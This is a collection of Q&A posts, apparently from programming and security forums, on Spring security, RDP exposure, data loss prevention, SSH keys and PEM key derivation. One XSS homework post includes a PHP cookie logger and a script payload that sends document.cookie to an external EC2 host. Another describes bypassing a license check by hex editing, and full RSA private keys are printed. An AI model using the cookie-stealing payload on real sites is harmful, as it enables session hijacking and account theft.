        request.setAttribute(""firstname"", pauDto.getFirstname());
        request.setAttribute(""amount"", pauDto.getAmount());


        return ""forward:https://website"";
    }
</code></pre>

<p>2] redirect(Using Redirect attributes with redirect:// also has not helped as the application is redirected to payment gateway but no data is sent (as redirect cannot be used to forward request)</p>

<pre><code>   @RequestMapping(value=""/serverRedirection"",method = RequestMethod.GET)
    public String myMethod(RedirectAttributes  request,HttpServletRequest req) {

        RechargeDto rechargeDto = new RechargeDto();
        rechargeDto.setAmount(""500"");
        rechargeDto.setProvider(""AT"");
        rechargeDto.setMobile(""9892948061"");
        logger.info(""Entered recharge controller"");
        String message = ""Invalid from app"";


        PauDto pauDto = rechargeService.passToPayu(Float.parseFloat(rechargeDto.getAmount()), 2l, ""9898989898"");
        pauDto.getService_provider());
        request.addAttribute(""firstname"", pauDto.getFirstname());
        request.addAttribute(""amount"", pauDto.getAmount());


        return ""redirect:https://website"";
    }
</code></pre>

<p>Is there any way to achieve this or is there any alternative way .</p>
",1
"<p>I am doing this persistent cross site scripting challenge homework, we are supposed to steal cookie by useragent injection. More details of this challenge can be found on this <a href=""https://www.enigmagroup.org/pages/challenges"" rel=""nofollow noreferrer"">page (basic 41)</a>:</p>

<p>Background:</p>

<p>since this challenge is on a toy website, the website simulate the victim viewing the page for us. What we need to do is to inject the code to the challenge page server and steal victim's cookie by that code and send those cookies to a web server we set up ourselves. Once we successfully collected victims' cookies, we can set our own cookie to those values to pass the challenge. </p>

<p>What I did so far:</p>

<ol>
<li><p>Set up the web server on <code>aws ec2</code>. 
I believe it's centos, but can't find more release information since getting trouble installing centos-release package or things like that. All I can find is only: <code>Amazon Linux AMI 2018.03.0.20181129 x86_64 HVM gp2</code>. Inbound rules are set to be port 22 for <code>ssh</code> and port 80 for <code>http</code>. httpd, mysql, php are installed and tested working. File <code>index.html</code> under <code>/var/www/http</code> display normally in browser.</p></li>
<li><p>Put <code>cookie_stealer.php</code> under <code>/var/www/http</code></p>

<p>My code of <code>cookie_stealer.php</code>:</p></li>
</ol>

<pre><code>&lt;?php
$cookie = isset($_GET['c']) ? $_GET['c'] : 'There is no variable c';
$fp = fopen('log.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.""\r\n"");
fclose($fp);
?&gt;
</code></pre>

<ol start=""3"">
<li>Inject code to user agent of Chrome:</li>
</ol>

<pre><code>&lt;script type=""text/javascript""&gt;document.location=""ec2-52-91-99-56.compute-1.amazonaws.com/cookiesteal-simple.php?c=""+document.cookie&lt;/script&gt;
</code></pre>

<p>So far, I successfully injected the code, but the value of <code>document.cookie</code> won't be passed to my php file. So I am currently focusing on this issue.</p>

<ol start=""4"">
<li>extra information</li>
</ol>

<p>I am testing how to pass variable to php by testing through url:</p>

<pre><code>http://ec2-52-91-99-56.compute-1.amazonaws.com/cookie.php?c=ahhh
</code></pre>

<p>an interesting(WEIRD!!) thing is, after I added the folloing line to my php file after the <code>$_GET['c']</code> line:</p>

<pre><code>echo 'Cookie: ' . $cookie . ""\r\n"";
</code></pre>

<p>the value of <code>c</code> can be printed on the web page as <code>ahhh</code>, but isn't written into the <code>log.txt</code>. The <code>log.txt</code> only records this:</p>

<pre><code>Cookie:There is no variable c
Cookie:There is no variable c
Cookie:There is no variable c
Cookie:There is no variable c
</code></pre>

<h3>My question is, if the variable <code>c</code> is passed to <code>$cookie</code> on server, why that ternary operator always return <code>'There is no variable c'</code> while the web page displaying <code>ahhh</code>. Can anyone tell me why this is happening or where else I can look at? Any hint would be appreciated!</h3>
",1
"<p>I have a <strong>Spring application</strong> ( let's call it <strong>A</strong> for <strong>Authentication</strong>) used as an authentication server. 
<strong>A</strong> is enabling <strong>SSO</strong> for two other applications ( <strong>B for Business and C for Client</strong>).</p>

<p>SSO authentication is done by redirection : </p>

<ul>
<li>a User goes to the <strong>B</strong> or <strong>C</strong> URL, he is redirected to the A login page for Authentication. Once logged in, he is redirected back to the <strong>B</strong> or <strong>C</strong> application.</li>
</ul>

<p>The redirection is done using the <strong>redirectUrl</strong> parameter in the <code>org.springframework.security.web.savedrequest.SavedRequest</code>.</p>

<p>So, a user can come either be coming from <strong>B</strong> or <strong>C</strong> application, or logging in directly to his account on the <strong>A</strong> application. </p>

<p>My problem, is the following. Let's take the case of a user wants to connect to the <strong>B</strong> application, once he is redirected to the <strong>A</strong> application , he does not login.
After a while a session timeout occurs, and the session is destroyed, so when he logs in, he is not redirected to the <strong>B</strong> application, but rather to his account on the <strong>A</strong> application.</p>

<p>Possible solutions:</p>

<ul>
<li><p>The obvious way, is to disable timeout on the HttpSession :</p>

<p><code>&lt;session-config&gt;
    &lt;session-timeout&gt;-1&lt;/session-timeout&gt;
&lt;/session-config&gt;</code></p>

<p>This is not a very good idea as it is a security risk, and a threat to overload the authentication server.</p></li>
<li><p>I added a <code>HttpSessionDestroyedEvent</code>  ApplicationListener in order to detect a timeout and store the request of the session to be destroyed. The main idea was to redirect the user once he is connected after timeout. So on a successful connection, i check my  request cache in the <code>AuthenticationSuccessHandler</code> to see if a request is stored and redirect the user. </p>

<pre><code>if (timeOutHandler.isTimeOut()) {
    redirectStrategy.sendRedirect(request, response, 
    timeOutHandler.getRequest().getRedirectUrl());
    timeOutHandler.clearSession();
    return;
 }
</code></pre>

<p>The problem with this approach is that I have no previous knowledge of the user who caused the timeout and I could end up in a scenario like this:  </p>

<ul>
<li>A user come from <strong>B</strong> application, causes a timeout. </li>
<li>The request with redirect to <strong>B</strong> is stored.</li>
<li>Another user comes from <strong>C</strong> application causes also a timeout.</li>
<li>The request with redirect to <strong>B</strong> is overridden with the request to 
redirect  to <strong>C</strong>.</li>
<li>The first user tries to connect, he will be redirect to the application <strong>C</strong></li>
</ul></li>
</ul>

<p>So, what do you think will be the best approach, or do you have a better solution? </p>

<p>Thank you for your help.</p>
",1
"<p>I am not a software engineer as you will see if you continue reading, however I managed to write a very valuable application that saves our company lots of money.  I am not paid to write software, I was not paid for writing this application, nor is my job title software engineer so I would like to have total control over who uses this application if I ever had to leave since as far as I can tell it is not legally theirs (did not write during company hours either).  </p>

<p>This may sound childish but I've put much much time into this and I've been maintaining it almost on a daily basis so I feel that I should have some control over it, or at least could sell it to my company if they ever had to let me go, or I wanted to move on.</p>

<p>My current protection scheme on this application looks something like this:</p>

<pre><code>string version;
WebRequest request = WebRequest.Create(""http://MyWebSiteURL/Licence text file that either says 'expired' or ""not expired'"");
WebResponse response = request.GetResponse();
StreamReader stream = new StreamReader(response.GetResponseStream());
version = stream.ReadToEnd();
stream.Close();
response.Close();

if (version == (""not expired"") == false)
{
    MessageBox.Show(Environment.NewLine + ""application expired etc etc"", ""Version Control"");
}
</code></pre>

<p>It checks my server for ""not expired"" (in plain text), and if the webrequest comes back as anything but ""not expired"", it ultimately pops up another form stating it is expired and allows you to type in a passcode for the day which is a multiplication of some predetermined numbers times the current date to create ""day passes"" if ever needed (I think Alan Turing just rolled over in his grave).</p>

<p>Not the best security scheme, but I thought it was pretty clever having no experience in software security.  I have however heard of hex editing to get around security so I did a little test for science and found this area of my compiled EXE:</p>

<blockquote>
  <p>""System.Net.WebRequest.""  Which I filled in with zeros to look like this: System.Net000000000</p>
</blockquote>

<p>That was all it took to offset the loading of the application to hiccup during the server check which allowed me to click ""continue"" and completely bypass all my ""security"" and go along using the program without it ever expiring.  </p>

<p>Now would a normal person go to this length (hex editing) to try to get past my protection scheme?  Not likely, however just as a learning experience, what could I do as an added step to make hex editing or any other common workarounds not work unless it was by ""professional"" cracker? </p>

<p>Again I'm not  paranoid, I'm just eager to learn more about security of applications.  I was both proud of myself and ashamed at the same time for creating and breaking my own protection.</p>

<p>If commenting, please be kind since I know this is probably a humerus post to those more informed than I as I really have little experience in writing software and have never taken any type of course etc.  Thanks for reading!</p>
",1
"America’s Nuclear Regulatory Commission was successfully attacked three times within the past hree years, by unknown attackers, some foreign – and largely using standard phishing emails.

America’s Nuclear Regulatory Commission was successfully attacked three times within the past three years, by unknown attackers, some foreign – and largely using standard phishing emails and similar techniques, according to the news site NextGov.

Two of the incidents have been traced to unknown foreign individuals, and another to an unidentifiable attacker, as records have been lost.

CNET reports that one incident led 215 employees of the nuclear agency to “a logon-credential harvesting attempt,” hosted on “a cloud-based Google spreadsheet.” The information was obtained through a specific request by NextGov.

Phishing emails: Lethal targets

A second spearphishing attack targeted specific employees with emails crafted to dupe them into clicking a link which led to malware on Microsoft’s cloud storage site SkyDrive.

The third attack was a spearphishing attack directed at a specific employee. Once his account credentials were obtained, emails were sent to 15 further employees, with malware-laced PDFs.

“It’s still unclear which country originated the attacks, and whether the attackers were acting independently or as a part of a larger state action. It’s also unclear how far the attackers got,” the Verge reports.

‘Team thwarts most attempts’

NRC spokesman David McIntyre said that his security team “thwarts” most such attempts.

“The few attempts documented in the OIG (Office of the Inspector General) cyber crimes unit report as gaining some access to NRC networks were detected and appropriate measures were taken,” he said, speaking to CNET.

Slashgear reports, “The reasons for the hacks aren’t known, but are suspected to be an effort to harvest details about the nation’s nuclear infrastructure – another suggestion is that the NRC might not be a specific target, but instead swept up by chance in a more general attack by an individual hacker rather than a foreign nation’s government.”

A recent report on America’s energy agencies said such incidents were increasing 35% between 2010 and 2013.

The report, “INFORMATION SECURITY Agencies Need to Improve CyberIncident Response Practices.” said, “Our sample indicates that agencies demonstrated that they completed their eradication steps for the majority of cyber incidents. Specifically, our analysis shows that for about 77 percent of incidents governmentwide, the agencies had identified and eliminated the remaining elements of the incident. However, agencies did not demonstrate that they had effectively eradicated incidents in about 23 percent of incidents.”

The report made 25 suggestions about how agencies could improve responses, including that agencies should, “revise policies for incident response to include requirements for defining the incident response team’s level of authority, prioritizing the severity ratings of incidents based on impact and establishing measures of performance.”",1
"<p>While your approach is much more than an average user would do in home environment, there are several attack vectors you may want to mitigate (for fun, learn or serious concern if you are a international spy :).</p>

<p>First of all, you already has blind (infinite) trust in several actors:</p>

<ul>
<li>your hardware manufacturer (chip firmwares, BIOS/UEFI, etc.)</li>
<li>your Operating system vendor,</li>
<li>KeePass vendor (unless you checked the source line by line),</li>
<li>TrueCrypt vendor (-""-),</li>
<li>your cloud provider,</li>
<li>anyone who has administrative rights on your machine,</li>
<li>anyone who is able to compromise your system in any ways,</li>
<li>all employees of the above software vendors with commit right to their source code (unless you thoroughly examined their quality and security policies). </li>
</ul>

<p>Any of the above actors can access your passwords without problem. In serious security designs you should reduce the number of trusted actors to the minimum, and you should <strong>never trust in single actor</strong>. </p>

<p>You can mitigate the security problems the following way:</p>

<p>1) Keep most important passwords in your head. This is the good way, and the intended way of using passwords. Medieval people were able to memorize entire holy (Latin) texts without understanding. We are not trained for that, but it is possible. </p>

<p>2) Always use 2FA (two factor authentication) for your important accounts. The biggest advantage of 2FA is that, you don't have to trust single actor. If the attacker compromised your machine or backdoored your operating system, she still have to steal your fingerprint or compromise your phone and security device. If you trust solely in passwords, and you don't keep them in you head, single actor is enough to defeat your defence. It's a several order of magnitude less probable that two actors are cooperating. National Cyber Armies certainly can do that, but otherwise you are more or less safe. </p>

<p>3) Keep the number of actors at the minimum. A portable pendrive with a simple text-file, encrypted with a decent algorithm and a good key is much more secure than your current setup because you trust much less actors: the current hardware, the current OS and the algorithm. You can include your own decryptor made in C or python. Some portable open source hardware with a small display and with simple verifiable code is even better. It might not be very convenient, but it's more secure.</p>

<p>4) Keep it simple. In security simplicity is crucial. The more you can verify personally the less you have to trust. </p>

<p>If you do all the above, most attacker is probably better off with sending a thug to beat you in order to acquire the credentials. :-)</p>

<p>EDIT: 
If the number of passwords are large and you can not avoid some kind of password manager, I suggest an off-system one. Pendrive with stand-alone password manager is good enough. Or you can build your own security device with Arduino framework which can even type your passwords. </p>
",1
"<p><strong>TL;DR</strong> We are looking at opening port 3389 for a terminal server all the advice I’ve seen is that its suicidal but without good explanations as to why. Is it really that bad?</p>

<p>We are looking at setting up a terminal server for staff to access remotely. They are going to be using a bunch of devices including iPads, Android Divices, Windows (XP to 8), OSX, Linux, pretty much anything with an RDP client.</p>

<p>I want this to be stupid simple and work on everything. My plan is to setup remote.example.com (obviously with our real domain name) to point to our server then secure it by: </p>

<ol>
<li>Firewall everything except port 3389.</li>
<li>Set there encryption level to highest (with a certificate) and not allow “Negotiate”</li>
<li>Lock accounts with more than 7 failed attempts and look at maybe some script to block based on IP addresses with failed logins (<a href=""https://security.stackexchange.com/a/17354/22241"">https://security.stackexchange.com/a/17354/22241</a>)</li>
<li>Other obvious things such OS updates and anti-virus.</li>
</ol>

<p>However when I talk about setting up a public facing RDP the responses are generally along lines of:</p>

<p><strong>“Don’t open port 3389 put a VPN in front of it”</strong> – but as far as I can see the two main arguments for this are encryption (Doesn’t RDP already do this?) and better authentication because people will brute force RDP. We allready have a PPTP VPN setup but it just uses the same account username/password combo to authenticate as our Terminal server would so I don't see a terminal server adding to our attack surface. The only argument that I think holds any weight is setting up a VPN (such as Cisco) that supports two factor authentication, that sounds good but will massively reduce the number of devices that are supported. </p>

<p><strong>""Don't do it, use an RD Gateway""</strong>
As far as I can see reading <a href=""http://technet.microsoft.com/en-us/library/cc731150.aspx"" rel=""nofollow noreferrer"">http://technet.microsoft.com/en-us/library/cc731150.aspx</a> the advantages of a RD Gateway are:</p>

<p>Manage multiple servers from a single entry point with fine grained control over who can connect to what and so on.  - Sounds good but we only have one terminal server.</p>

<p>Uses port 443/HTTPS so people behind poorly configured outbound firewalls can connect – sounds great but RDP already offers encryption and changing the port doesn’t add security. Also for all the extra ease of not needing to deal with outbound firewalls comes the lack of support from most RDP clients (last I checked the OSX clients couldn’t connect to RD Gateway) </p>

<p><strong>""Don't use RDP, use (Hamachi/Team Viewer/Jump Desktop/VNC … seriously/some other RDP tool) it's safer""</strong>
To me any of these suggestions go from putting all your eggs in one basket (Microsoft) to putting all your eggs in another basket (Hamachi) but without tangible security benefit.</p>

<p>Am I just being dismissive? Is setting up a public facing RDP server a bad idea?</p>
",1
"<p>For a test environment, I have an <code>.ldif</code> file to grant the <code>ben</code> user, the <code>ADMIN</code> role, as this role is required by my Spring security configuation: <code>.hasRole(""ADMIN"").anyRequest()</code>.</p>

<p>Here is the <code>.ldif</code> file content:</p>

<pre><code>dn: ou=groups,dc=springframework,dc=org
objectclass: top
objectclass: organizationalUnit
ou: groups

dn: ou=people,dc=springframework,dc=org
objectclass: top
objectclass: organizationalUnit
ou: people

dn: uid=ben,ou=people,dc=springframework,dc=org
objectclass: top
objectclass: person
objectclass: organizationalPerson
objectclass: inetOrgPerson
cn: Ben LeHeros
sn: Ben
uid: ben
userPassword: {SHA}nFCebWjxfaLbHHG1Qk5UU4trbvQ=

dn: uid=toto,ou=people,dc=springframework,dc=org
objectclass: top
objectclass: person
objectclass: organizationalPerson
objectclass: inetOrgPerson
cn: Toto LeHeros
sn: Toto
uid: toto
userPassword: totopass

dn: cn=adMIN,ou=groups,dc=springframework,dc=org
objectclass: top
objectclass: groupOfNames
cn: ADMin
uniqueMember: uid=ben,ou=people,dc=springframework,dc=org

dn: cn=user,ou=groups,dc=baeldung,dc=com
objectclass: top
objectclass: groupOfNames
cn: user
member: uid=toto,ou=people,dc=springframework,dc=org
</code></pre>

<p>The test environment Spring Security configuration is the following:</p>

<pre><code>@Autowired
public void configureGlobal(AuthenticationManagerBuilder auth)
        throws Exception {
    auth
    .ldapAuthentication()
        .userDnPatterns(""uid={0},ou=people"")
        .groupSearchBase(""ou=groups"")
        .contextSource().ldif(""classpath:test-server.ldif"");
}

@Override
protected void configure(HttpSecurity http) throws Exception {
    http.csrf().disable().httpBasic()
            .authenticationEntryPoint(restAuthenticationEntryPoint).and()
            .authorizeRequests().antMatchers(""/**"")
            .hasRole(""ADMIN"").anyRequest()
            .authenticated();
}
</code></pre>

<p>There are a few observations:</p>

<p>1- The test is successful and the user is authenticated and accredited as having the admin role.</p>

<p>2- If instead of configuring the role accreditation as <code>.hasRole(""ADMIN"").anyRequest()</code> I do it as <code>.hasRole(""admin"").anyRequest()</code> then the user role given in the test is not accepted and the test fails with a 403 (not a 401) upon authentication.</p>

<p>3- The case does not seem to matter in the <code>.ldif</code> file as the <code>admin</code> group can be written as <code>adMIN</code> and <code>ADMin</code> and the test is still successful.</p>

<p>4- Replacing the <code>admin</code> group by a <code>user</code> group for the user, makes the test fails with a 403, that is, the user requires an admin role to be logged in.</p>

<pre><code>dn: cn=user,ou=groups,dc=springframework,dc=org
objectclass: top
objectclass: groupOfNames
cn: user
uniqueMember: uid=ben,ou=people,dc=springframework,dc=org
</code></pre>

<p>How come the case does not matter in the <code>.ldif</code> file and matters in the <code>configure</code> method ?</p>
",1
"The world is going crazy for Pokémon GO. Here are some top tips from ESET’s Lysa Myers on how to enjoy this latest sensation safely.

In case you’ve been living in a cave recently, and have managed to avoid being bombarded with social media posts and news stories about Pokémon GO, you can probably stop reading right now. But if you’re one of the untold millions of people around the world who have downloaded this location-based augmented reality mobile game, we’ve got a few tips for you about how to use it safely.

1. Download only from reputable app stores

Perhaps unsurprisingly, there are already malware-laden versions of Pokémon GO floating around. And these most definitely will not be the last such stories we hear. So stick with the Apple and Google app stores, and choose only the one with more downloads than just about every other app in the world.

Don’t be tempted to look elsewhere for the file if you encounter slow-downs caused by a large number of downloads. If you’re in doubt, Android users can scan the file with reputable anti-malware software.

2. Do not sign in with Google

Another difficulty caused by too many simultaneous downloads is that people have been unable to sign in directly through the Pokémon site, so the game’s developers added the ability to sign in with your Google account. The problem with this is that in the initial iOS version, this gave the app astounding levels of access to your Google account.

The latest version addresses this, but using any secondary site like Google, Apple or Facebook to login comes with privacy considerations you should weigh before agreeing.

3. Bring a buddy, stay in public places

Stories are already starting to come in about little kids wandering off into the woods and getting lost; people going places they’re not supposed to; people getting mugged , and others stumbling into traffic. Kids should be accompanied by a responsible adult, and adults should bring … well, another responsible adult.

4. Bring an extra battery

Apparently, the Pokémon app is quite the battery-vampire. This, combined with wandering off to places you may not know how to get back from, can put you in a sticky situation. It’s a good idea to bring a spare battery (and probably some snacks, water and money for a cab or bus fare) in case of an emergency.

5. Be sensible

Traveling in numbers doesn’t really ensure you won’t play while driving, cross the street without checking for traffic, or loiter creepily outside of people’s homes. Virtual monsters are not worth life and limb – or getting arrested. So don’t let the excitement of the game lure you into doing something you (or your next of kin) will regret.

It’s tempting to get swept away with new crazes, especially when the activity itself is so effective at giving you those neurochemicals that make you motivated to keep playing. In many ways the game has been a fantastic influence, with benefits such as inspiring people to exercise more and improving their mental health. With a little caution, you can get all the benefits with fewer risks.",1
"<p>On one of the old dev servers I manage there is an RSA public and private key pair  <em>~/.ssh/id_rsa.pub</em>  and  <em>~/.ssh/id_rsa</em> in a staging user account (used for automation and testing prior to production).</p>

<p>It had been converted into a VPS. Because it is still very much in service, <code>pull</code>ing from Bitbucket iterating weekly through many separate but related projects, each on carefully chosen schedules, it is crucial that the same ssh key retain read-write access to those repositories.  The QA processes occasionally make robotic updates that <code>git push</code> meta data back up the <em>remote origin</em>s. The identity (keys) must not change.</p>

<p>I read through 
 <a href=""https://confluence.atlassian.com/bitbucket/use-the-ssh-protocol-with-bitbucket-cloud-221449711.html"" rel=""nofollow"">https://confluence.atlassian.com/bitbucket/use-the-ssh-protocol-with-bitbucket-cloud-221449711.html</a> and other online resources but find myself at a loss how to grant this email-less identity write access to new repositories (eg. forks) on difference Bitbucket accounts.</p>

<p>Although I possess the original SSH key for that robot staging account, I don't have access to its Bitbucket account (if any) because I simply don't know which one it is, and have exhausted all possibilities.  However its public key cannot be added to any other BB account (using <strong>Add key</strong> at <a href=""https://bitbucket.org/account/user/MEMEME/ssh-keys/"" rel=""nofollow"">https://bitbucket.org/account/user/MEMEME/ssh-keys/</a> ), stating it's already taken.</p>

<p>That is fine; I don't want to link it to the entire account anyway, but only to specific repos under <strong>Access management</strong> at
<a href=""https://bitbucket.org/USER/PROJECT/admin/access"" rel=""nofollow"">https://bitbucket.org/USER/PROJECT/admin/access</a></p>

<p>Trouble is, at that URL one can only submit Bitbucket usernames or <em>working</em> email addresses, <strong><em>not public ssh keys.</em></strong>  The dev account setup behind this robot identity has never had its domains' MX records nor mail boxes etc. setup to actually receive email--only enough to satisfy <strong>git config</strong> from complaining--and I had gone through many possibilities anyway.  All bounced back or failed to end up in catch-all boxes.  </p>

<p>This leaves me in a bit of a pickle.</p>

<p>Any ideas how given either a pub or priv ssh key, I can find the owner/associated email addresses (even if broken) out in the wild?</p>

<p>The real goal would be to grant this account write access to <em>fork</em>ed repositories, not the originals.</p>

<pre><code># ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYBzHi7y9szZz5um3JLPSYPm3LYTVTzkGl8v58dhiIBDA+8xXlpMJQGFZHT0zmg8+Y+409qQQKzbILcx
T6/rYt5HE57GFNK5DRwaKMCCICabVHF0aJKf9mKlY9fY2TwCZP7ufeISA88pQNQIHpPIuDDy1vFO6yBkkVx8aPIH0q/bvCVE89W+8fpGgdwKq9+dDB0KZp1X
3VMYF0IsJRpH5OGWaQDQHHxJX+sudyWtABlQ3UAgWyp0hkmx1q1kulahk1BrX1wrJOdOrxgpwBnRVHm6dEyJR6j7pK3ZR+4duQqHVkOP//J6RQsdK/voPrSE
z2C0tuuuJn1hBwSJxkn4VN web@staging
</code></pre>
",1
"<p>One approach is to lock down endpoints to <strong>block the egress points</strong>, which includes:</p>

<ul>
<li>Disabling local media: USB, SD cards, CD writers, firewire, etc. Many enterprises attempt this - disabling USB is considered a standard baseline - but rarely are all these blocked. Thin clients can do this more robustly than a normal computer.</li>
<li>Blocking network egress: this is harder; some enterprises use a content filtering proxy to block file sharing sites and webmail, but they never block them all, and in particular corporate email needs to be allowed.</li>
<li>You need to prevent unauthorised devices connecting to the network, as these will not have local media disabled, so can be used to egress. Some enterprises attempt this with network access control (NAC).</li>
</ul>

<p>I see this done in many environments, but never comprehensively. But even if this could be implemented perfectly, there is a major problem: it's too restrictive. We disabled USB because we want to stop Joe copying the top secret database onto a USB stick. Now, Joe may want to - quite legitimately - put some non-confidential marketing material on a USB stick to use at a conference. The lockdown prevents this - it doesn't have any concept of classification, so it can't distinguish between a public presentation and a top secret memo. Most enterprises have a process to request USB be re-enabled, with a business justification, but at that point Joe can steal the top secret database.</p>

<p>To improve on this, various vendors have created <strong>Data Loss Prevention</strong> (DLP) tools. Some of them are called Data Loss Mitigation (DLM); it's the same technology. These work in various ways, but most have an agent on the endpoint, and a central management system. When the system is installed, various key documents will be marked as confidential, and some patterns may be used (a popular one is 16 digits, indicating a credit card number). Now, when Joe tries to write a file to his USB stick, the agent checks whether the file is confidential, and then allows (or doesn't allow) the file to be written.</p>

<p>Commercial DLP systems are now pretty mature and try to address all the local media and network egress points. It's important to realise that they are only intended to stop your internal staff. They will not generally stop hackers (despite the claims some vendors make). Still, they are a good technology to have, and although they are not that widely used, I think most security conscious organisations should have it. I think the cost/benefit ratio is better than you get from IDS.</p>

<p>As people have mentioned, one egress point that nothing can protect is people. You can stop someone copying a 10gb database to a USB drive. But if the top secret data is one sentence (""it was xxxx who shot JFK"") then someone can of course read that, remember it, then leak it outside your organisation. And to stop someone photographing their screen you would need physical security controls, like confiscating personal electronic devices.</p>
",1
"<p>I installed a CAS server on my server . ( with war deployment in apache tomcat ) . I have my user information like user name and password on that CAS server . ( in the future it will connect to the LDAP or simple relation database for user credential . The problem is here . I want to authenticate my spring application through this CAS server , but I couldn't find any proper configuration for spring security . My config file is :</p>

<pre><code>        @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf().disable()
            .authorizeRequests()
                .antMatchers(""/assets"",""/css"", ""/js"",""/font-awesome"",""/bootstrap"",""/images"").permitAll()
                .antMatchers(""/"", ""/home"").authenticated()
//                .antMatchers(""/hi"").access(""hasRole('ROLE_SUBSCRIPTION') or hasRole('ROLE_ADMIN')"")
                .antMatchers(""/edit"").authenticated()
//                .antMatchers(""/playlists/*"").authenticated()
//                .antMatchers(""/createplaylist"").authenticated()
                .and()
            .formLogin()
                .loginPage(""/login"")
                .permitAll()
                .and()
            .logout()
                .permitAll();
    }

    @Bean
    public ServiceProperties serviceProperties() {
        ServiceProperties sp = new ServiceProperties();
        sp.setService(env.getRequiredProperty(CAS_SERVICE_URL));
        sp.setSendRenew(false);
        return sp;
    }
    @Bean
    public Set&lt;String&gt; adminList() {
        Set&lt;String&gt; admins = new HashSet&lt;String&gt;();
        String adminUserName = env.getProperty(APP_ADMIN_USER_NAME);

        admins.add(""admin"");
        if (adminUserName != null &amp;&amp; !adminUserName.isEmpty()) {
            admins.add(adminUserName);
        }
        return admins;
    }

    @Bean
    public AuthenticationUserDetailsService&lt;CasAssertionAuthenticationToken&gt; customUserDetailsService() {
        return new CustomUserDetailsService(adminList());
    }
    @Bean
    public CasAuthenticationProvider casAuthenticationProvider() {
        CasAuthenticationProvider casAuthenticationProvider = new CasAuthenticationProvider();
//        casAuthenticationProvider.setAuthenticationUserDetailsService(customUserDetailsService());
//        casAuthenticationProvider.setServiceProperties(serviceProperties());
        casAuthenticationProvider.setTicketValidator(cas20ServiceTicketValidator());
//        casAuthenticationProvider.setKey(""an_id_for_this_auth_provider_only"");
        return casAuthenticationProvider;
    }
    @Bean
    public Cas20ServiceTicketValidator cas20ServiceTicketValidator() {
        return new Cas20ServiceTicketValidator(env.getRequiredProperty(CAS_URL_PREFIX));
    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
//        auth.inMemoryAuthentication().withUser(""admin"").password(""admin"").roles(""ADMIN"");
        auth.authenticationProvider(casAuthenticationProvider());
    }
</code></pre>
",1
"<p>I'm generating a public PEM-format key from a private PEM-format key. I noticed that if I change a few characters near the end of the private PEM that the public PEM generated from the modified private PEM is exactly the same as the result from the unmodified private PEM.</p>

<p>For example, this private PEM</p>

<pre><code>-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCAAZXj8YAEQya8jF8l6Hy56BcRBgplxPd8ZM5LIAWm0w1k/CgB
gvrI28W+5orOyqST2gC4EBEGmLw9s3NC8McL3qqFIQvd6SpWzCJEiI9n+wCkJLYf
715t6BwZo8F82AdqRHwL1lL0T4JeakgcFO5zno2l/NYKpZtS78vIq2F8pwIDAQAB
AoGAIAdFh+lPTMG4mYjN7eBEBQgrbVkDlP85pWhbrbRvdZRtT41APVCWi1diHSf2
J1PQ5iWv9F4gxHPG9fFGr8MrKk+jCM0/rDJsN7yC1yiSerS9zNvoSWu4D1cizRn2
ZOFi+TJZVHAoVvuh1vJdsFLkDmfoXelR6v6ojQxp6IftblECQQD7W4F92yHVIkRt
ZEz5TMYxtFF2d5uwi6XA/1MDuWpK0dK20a7DUGmgQ8faNfSZ/Dr1JmLx0OK/+Ocg
5HnzNo5NAkEAgl7Wa/Lr0TUH5h4L3SsJ1aeYUC6CbzJHBpNTvhuC7YEcs0AJL2k3
qYSM8VpU7q9iGHvfQhnKH9eBXlQbJBt4wwJBAJ1Pj6Ns2afCYoD0HRiJbCD/cVxr
Tw0W2Q4IvbO+/z8EQpQYdv/V+8VJpnJzAjq9GUkEVThyOvdal4yGcaw9oKECQC8V
/a+jXxSCaMXuGC7bOoQWMebTxXxP1mNDlr1UxmbteOYsvKSJBfeNzjHlhENoyK87
HhmLovr5JNpi2iKiYW0CQDyniRLXCyBVayJd3QkuMFKVNUuOytXUFWNXTpLA1Nbb
2K+leKb2KSyyEmRFC2X+QwF9ZBP1C3b0lgBBlBVbpWQ=
-----END RSA PRIVATE KEY-----
</code></pre>

<p>and this private PEM</p>

<pre><code>-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCAAZXj8YAEQya8jF8l6Hy56BcRBgplxPd8ZM5LIAWm0w1k/CgB
gvrI28W+5orOyqST2gC4EBEGmLw9s3NC8McL3qqFIQvd6SpWzCJEiI9n+wCkJLYf
715t6BwZo8F82AdqRHwL1lL0T4JeakgcFO5zno2l/NYKpZtS78vIq2F8pwIDAQAB
AoGAIAdFh+lPTMG4mYjN7eBEBQgrbVkDlP85pWhbrbRvdZRtT41APVCWi1diHSf2
J1PQ5iWv9F4gxHPG9fFGr8MrKk+jCM0/rDJsN7yC1yiSerS9zNvoSWu4D1cizRn2
ZOFi+TJZVHAoVvuh1vJdsFLkDmfoXelR6v6ojQxp6IftblECQQD7W4F92yHVIkRt
ZEz5TMYxtFF2d5uwi6XA/1MDuWpK0dK20a7DUGmgQ8faNfSZ/Dr1JmLx0OK/+Ocg
5HnzNo5NAkEAgl7Wa/Lr0TUH5h4L3SsJ1aeYUC6CbzJHBpNTvhuC7YEcs0AJL2k3
qYSM8VpU7q9iGHvfQhnKH9eBXlQbJBt4wwJBAJ1Pj6Ns2afCYoD0HRiJbCD/cVxr
Tw0W2Q4IvbO+/z8EQpQYdv/V+8VJpnJzAjq9GUkEVThyOvdal4yGcaw9oKECQC8V
/a+jXxSCaMXuGC7bOoQWMebTxXxP1mNDlr1UxmbteOYsvKSJBfeNzjHlhENoyK87
HhmLovr5JNpi2iKiYW0CQDyniRLXCyBVayJd3QkuMFKVNUuOytXUFWNXTpLA1Nbb
2K+leKb2KSyyEmRFC2X+QwF9ZBP1C3b0lgBBlBVbpWdddddddddddddddddddddddddQ=
-----END RSA PRIVATE KEY-----
</code></pre>

<p>both result in the same public PEM being generated:</p>

<pre><code>-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCAAZXj8YAEQya8jF8l6Hy56BcR
BgplxPd8ZM5LIAWm0w1k/CgBgvrI28W+5orOyqST2gC4EBEGmLw9s3NC8McL3qqF
IQvd6SpWzCJEiI9n+wCkJLYf715t6BwZo8F82AdqRHwL1lL0T4JeakgcFO5zno2l
/NYKpZtS78vIq2F8pwIDAQAB
-----END PUBLIC KEY-----
</code></pre>

